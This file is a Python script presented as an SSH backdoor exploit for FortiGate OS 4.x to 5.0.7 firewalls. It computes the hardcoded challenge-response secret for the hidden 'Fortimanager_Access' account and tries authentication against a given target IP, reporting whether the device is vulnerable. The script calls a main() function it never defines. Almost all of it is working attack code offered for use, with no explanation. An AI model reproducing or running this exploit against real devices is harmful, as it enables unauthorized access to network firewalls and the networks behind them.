#!/usr/bin/env python

# SSH Backdoor for FortiGate OS Version 4.x up to 5.0.7
# Usage: ./fgt_ssh_backdoor.py <target-ip>

import socket
import select
import sys
import paramiko
from paramiko.py3compat import u
import base64
import hashlib
import termios
import tty

def custom_handler(title, instructions, prompt_list):
    n = prompt_list[0][0]
    m = hashlib.sha1()
    m.update('\x00' * 12)
    m.update(n + 'FGTAbc11*xy+Qqz27')
    m.update('\xA3\x88\xBA\x2E\x42\x4C\xB0\x4A\x53\x79\x30\xC1\x31\x07\xCC\x3F\xA1\x32\x90\x29\xA9\x81\x5B\x70')
    h = 'AK1' + base64.b64encode('\x00' * 12 + m.digest())
    return [h]


def verify(host):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(host, username='', allow_agent=False, look_for_keys=False)
    except paramiko.ssh_exception.SSHException, e:
        pass
    else:
        msg = 'safe'
        return False, host, msg

    trans = client.get_transport()
    try:
        trans.auth_password(username='Fortimanager_Access', password='', event=None, fallback=True)
    except paramiko.ssh_exception.AuthenticationException, e:
        pass
    else:
        msg = 'safe'
        return False, host, msg
    
    try:
        trans.auth_interactive(username='Fortimanager_Access', handler=custom_handler)
        msg = 'vul'
        return True, host, msg
    except Exception, e:
        msg = 'safe'
        return False, host, msg


if __name__ == '__main__':
    main()
